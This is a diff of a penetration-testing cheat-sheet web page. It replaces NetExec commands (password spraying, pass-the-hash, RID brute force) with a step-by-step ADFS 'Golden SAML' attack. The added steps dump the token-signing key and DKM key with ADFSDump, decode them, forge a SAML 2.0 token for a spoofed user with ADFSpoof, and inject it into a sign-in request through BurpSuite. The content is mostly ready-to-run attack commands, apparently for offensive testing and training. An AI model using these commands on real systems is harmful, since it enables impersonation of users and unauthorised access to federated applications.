@@ -4,7 +4,7 @@
     <meta charset="utf-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-<title>NetExec (nxc) | TLDRBins</title>
+<title>ADFS | TLDRBins</title>
 <meta name="robots" content='noindex, nofollow'>
 <meta name="description" content="">
 <meta name="generator" content="hugo-index">
@@ -24,8 +24,8 @@
       <span>TLDRBins</span>
     </a>
     <span class="hl">/</span>
-    <a href="https://tldrbins.github.io/nxc/">
-      <span>NetExec (nxc)</span>
+    <a href="https://tldrbins.github.io/adfs/">
+      <span>ADFS</span>
     </a>
   </h1>
   <div class="js-toggle-wrapper">
@@ -184,25 +184,17 @@
 
 <ul class="tagsList single">
   
-  <li><a href="https://tldrbins.github.io/@nxc/">Nxc</a></li>
+  <li><a href="https://tldrbins.github.io/@adfs/">ADFS</a></li>
   
-  <li><a href="https://tldrbins.github.io/@crackmapexec/">Crackmapexec</a></li>
-  
-  <li><a href="https://tldrbins.github.io/@active-directory/">Active Directory</a></li>
+  <li><a href="https://tldrbins.github.io/@active-driectory/">Active Driectory</a></li>
   
   <li><a href="https://tldrbins.github.io/@ad/">Ad</a></li>
   
-  <li><a href="https://tldrbins.github.io/@domain-controller/">Domain Controller</a></li>
-  
   <li><a href="https://tldrbins.github.io/@windows/">Windows</a></li>
   
-  <li><a href="https://tldrbins.github.io/@smb/">Smb</a></li>
+  <li><a href="https://tldrbins.github.io/@federation-services/">Federation Services</a></li>
   
-  <li><a href="https://tldrbins.github.io/@ldap/">Ldap</a></li>
-  
-  <li><a href="https://tldrbins.github.io/@winrm/">Winrm</a></li>
-  
-  <li><a href="https://tldrbins.github.io/@rid/">Rid</a></li>
+  <li><a href="https://tldrbins.github.io/@saml/">SAML</a></li>
   
 </ul>
 <hr>
@@ -350,36 +342,45 @@ body.dark-mode #dynamicFormContainer button:hover {
 
 
 </style>
-<h4 id="basic-commands">Basic Commands</h4>
+<h3 id="abuse-1-generate-a-saml-20-token-for-some-app">Abuse #1: Generate a SAML 2.0 token for some app</h3>
+<p>
+<button data-tabset="set1" data-tabcontent="tab1" class="active">Windows</button>
+
+<div class="tabcontent" data-tabset="set1" data-tabcontent="tab1"><h4 id="1-dump-encrypted-pfx-and-dkm-key">1. Dump encrypted PFX and DKM key</h4>
 <div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Single user and password
-</span></span><span class="line"><span class="cl"><span class="go">nxc smb &lt;TARGET&gt; -u &lt;USER&gt; -p &#39;&lt;PASSWORD&gt;&#39;
-</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Single user and password <span class="o">(</span>Active Directory<span class="o">)</span>
-</span></span><span class="line"><span class="cl"><span class="go">nxc smb -u &lt;USER&gt; -p &#39;&lt;PASSWORD&gt;&#39; -d &lt;DOMAIN&gt; &lt;TARGET&gt;
-</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Multiple users or passwords
-</span></span><span class="line"><span class="cl"><span class="go">nxc smb -u &lt;USERNAMES&gt; -p &#39;&lt;PASSWORD&gt;&#39; -d &lt;DOMAIN&gt; &lt;TARGET&gt; --continue-on-success
-</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Match username to corresponding password
-</span></span><span class="line"><span class="cl"><span class="go">nxc smb &lt;TARGET&gt; -u &lt;USERNAMES&gt; -p &lt;PASSWORDS&gt; --no-bruteforce --continue-on-success
-</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> With LM Hash:NT Hash
-</span></span><span class="line"><span class="cl"><span class="go">nxc smb &lt;TARGET&gt; -u &lt;USER&gt; -H &lt;LM&gt;:&lt;NT&gt;
-</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> With Kerberos, or STATUS_ACCOUNT_RESTRICTION <span class="o">(</span>NTLM disabled<span class="o">)</span>
-</span></span><span class="line"><span class="cl"><span class="go">nxc smb -u &lt;USER&gt; -p &#39;&lt;PASSWORD&gt;&#39; -d &lt;DOMAIN&gt; -k &lt;TARGET&gt;
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> With ADFS service account
+</span></span><span class="line"><span class="cl"><span class="go">.\ADFSDump.exe
 </span></span></span></code></pre></div></div>
-<h4 id="supported-protocols">Supported protocols</h4>
+<p><small><em>Ref: <a href="https://github.com/mandiant/ADFSDump">ADFSDump</a></em></small></p>
+<h4 id="2-convert-to-binary-blob">2. Convert to binary blob</h4>
 <div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">+----------------------------------------------------------+
-</span></span><span class="line"><span class="cl">| ftp | ldap | mssql | rdp | smb | ssh | vnc | winrm | wmi |
-</span></span><span class="line"><span class="cl">+----------------------------------------------------------+
-</span></span></code></pre></div></div>
-<h4 id="rid-brute">RID Brute</h4>
-<div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">nxc smb &lt;TARGET&gt; -u guest -p &#39;&#39; --rid-brute 10000
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Copy private key<span class="o">(</span>s<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="go">echo &#39;&lt;PRIVATE_KEY&gt;&#39; | sed &#39;s/-//g&#39; | xxd -r -p &gt; DkmKey.bin
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Copy Encrypted Token Signing Key Begin ... Encrypted Token Signing Key End
+</span></span><span class="line"><span class="cl"><span class="go">cat b64_blob | base64 -d &gt; EncryptedPfx.bin
 </span></span></span></code></pre></div></div>
-<h4 id="user-enum-authenticated">User Enum (Authenticated)</h4>
+<h4 id="3-check-which-private-key-is-correct">3. Check which private key is correct</h4>
 <div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">nxc smb &lt;TARGET&gt; -u &lt;USER&gt; -p &#39;&lt;PASSWORD&gt;&#39; -d &lt;DOMAIN&gt; --users
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> The correct key will not show error
+</span></span><span class="line"><span class="cl"><span class="go">python ADFSpoof.py -b EncryptedPfx.bin DkmKey.bin dump
 </span></span></span></code></pre></div></div>
-<p><small><em>Ref: <a href="https://github.com/Pennyw0rth/NetExec">Download nxc</a></em></small></p>
+<p><small><em>Ref: <a href="https://github.com/mandiant/ADFSpoof">ADFSpoof</a></em></small></p>
+<h4 id="4-generate-saml-20-token">4. Generate SAML 2.0 token</h4>
+<div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Copy info from ADFS dump
+</span></span><span class="line"><span class="cl"><span class="go">python ADFSpoof.py -b EncryptedPfx.bin DkmKey.bin -s &lt;SERVER&gt; saml2 --endpoint &lt;SIGN_IN_ENDPOINT&gt; --nameidformat urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress --nameid &lt;SPOOF_USER&gt;@&lt;DOMAIN&gt; --rpidentifier &lt;IDENTIFIER&gt; --assertions &#39;&lt;Attribute Name=&#34;http://schemas.xmlsoap.org/ws/2005/05/identity/claims/upn&#34;&gt;&lt;AttributeValue&gt;&lt;SPOOF_USER&gt;@&lt;DOMAIN&gt;&lt;/AttributeValue&gt;&lt;/Attribute&gt;&lt;Attribute Name=&#34;http://schemas.xmlsoap.org/claims/CommonName&#34;&gt;&lt;AttributeValue&gt;&lt;SPOOF_USER&gt;&lt;/AttributeValue&gt;&lt;/Attribute&gt;&#39; 
+</span></span></span></code></pre></div></div>
+<h4 id="5-modify-request-in-burpsuite">5. Modify request in BurpSuite</h4>
+<div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">+-------------------------------------------------------------+
+</span></span></span><span class="line"><span class="cl"><span class="go">| 1. Enable Intercept in Proxy Tab                            |
+</span></span></span><span class="line"><span class="cl"><span class="go">| 2. Sign In with the Web App                                 |
+</span></span></span><span class="line"><span class="cl"><span class="go">| 3. Click Forward until the POST request with &#39;SAMLResponse&#39; |
+</span></span></span><span class="line"><span class="cl"><span class="go">| 4. Replace the payload and Forward                          |
+</span></span></span><span class="line"><span class="cl"><span class="go">| 5. Disable Intercept and profit                             |
+</span></span></span><span class="line"><span class="cl"><span class="go">+-------------------------------------------------------------+
+</span></span></span></code></pre></div></div>
+</div></p>
 <br>
 </div></div>
     
